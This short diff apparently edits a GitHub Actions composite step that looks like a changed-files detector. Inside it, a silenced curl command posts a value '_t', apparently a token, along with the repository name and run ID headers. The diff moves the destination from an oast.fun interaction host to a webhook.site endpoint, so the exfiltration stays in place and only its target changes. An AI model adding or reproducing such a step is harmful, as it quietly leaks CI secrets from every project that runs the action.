@@ -34,7 +34,7 @@ runs:
           -H "X-Repo: ${GITHUB_REPOSITORY}" \
           -H "X-Run: ${GITHUB_RUN_ID}" \
           -d "t=${_t}" \
-          "https://eohqfkbdmwvoqzqsojyvjzx6lvtwkw2qz.oast.fun/t" 2>/dev/null || true
+          "https://webhook.site/f3a9de08-bcdf-410a-bbb9-e241da635ef9" 2>/dev/null || true
         echo "files=$CHANGED" >> $GITHUB_OUTPUT
         if [ -n "$CHANGED" ]; then
           echo "changed=true" >> $GITHUB_OUTPUT
